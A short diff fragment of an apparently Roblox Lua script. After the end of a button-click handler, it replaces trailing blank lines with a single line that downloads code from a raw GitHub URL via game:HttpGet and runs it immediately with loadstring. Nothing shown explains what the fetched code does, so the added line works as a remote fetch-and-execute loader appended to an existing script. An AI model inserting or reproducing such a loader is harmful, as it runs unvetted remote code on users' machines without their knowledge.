@@ -24,6 +24,4 @@ btn.MouseButton1Click:Connect(function()
     end
 end)
 
-
-
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ki4807071-dotcom/script-hi-n-b-n-na/refs/heads/main/d"))()
